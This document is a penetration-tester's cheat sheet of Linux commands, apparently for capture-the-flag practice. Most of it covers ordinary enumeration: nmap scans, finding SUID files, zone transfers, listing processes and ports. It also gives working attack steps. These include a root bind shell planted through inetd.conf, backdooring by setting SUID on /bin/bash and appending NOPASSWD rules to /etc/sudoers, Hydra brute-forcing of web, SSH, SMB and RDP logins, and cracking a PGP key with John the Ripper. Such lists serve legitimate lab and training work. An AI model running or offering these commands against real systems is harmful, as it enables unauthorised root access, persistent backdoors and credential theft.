#### Finding SUID Binaries
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

#### Finding Writable Directories
```
find -type f -maxdepth 2 -writable
```

#### ifconfig alternative commands
```
netstat -ie
```

#### Bind Shell with inetd
```
echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf
/etc/init.d/inetd restart
```

#### Linux Shared Library Variable
```
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
```

#### Enumeration Scripts
```
linpeas.sh
linuxprivchecker.py
```

#### Firewall Enumeration
```
cat /etc/ufw/user.rules
```

#### Basic Nmap Commands
```
nmap -sV -sC --script vuln -oN filename.nmap [ip]

nmap -T4 -A -p- --script vuln [ip]
```

#### Spawning Interactive Shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### Finding Virtual Hosts aka Zone Transfers
```
dig axfr domain.htb @10.10.10.3

host -l domain.htb 10.10.10.3
```

#### Mounting Commands
```
showmount -e 10.0.0.7

mount -t nfs 10.0.0.17:/home/user ./mount/directory
```

#### Starting Python FTP Server
```
python -m pyftpdlib -p 21
```

#### Enumerating Running Processes
```
ps axjf --forest

ps aux
```

#### Forwarding Ports with Socat
```
socat tcp-listen:8009,fork tcp:192.168.40.129:8009 &
```

#### Enumerating Open Ports
```
netstat -tulpn

netstat -ntlp
```

#### Spawning tty Shell
```
stty raw -echo; fg
export TERM=xterm-256-color
stty rows 32 columns 158

Use "stty -a" to see current shell information
```

#### Starting smb service
```
sudo systemctl start smbd.service nmbd.service
```

#### PGP Decryption
```
gpg2john creds.priv > creds4john
john --wordlist=/usr/share/wordlists/rockyou.txt creds4john
echo "qwertyuiop" | gpg --batch --yes --allow-secret-key-import --import creds.priv
echo "qwertyuiop" | gpg --batch --yes --decrypt --passphrase-fd 0 creds.txt.gpg
```

#### Common Privilege Escalation Techniques
```
If there is a schedules process that runs as root you can add extra permissions to bash
( chmod +s /bin/bash)

(Making your account able to run sudo commands)
echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers
echo "www-data ALL=(root) NOPASSWD: /bin/bash" >> /etc/sudoers
```

#### Basic Hydra Syntax
```
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <ip> http-post-form "/index.php:username=USER&password=PASS:Incorrect"

hydra -l <username> -P <wordlist> <ip> ssh/smb/rdp
```

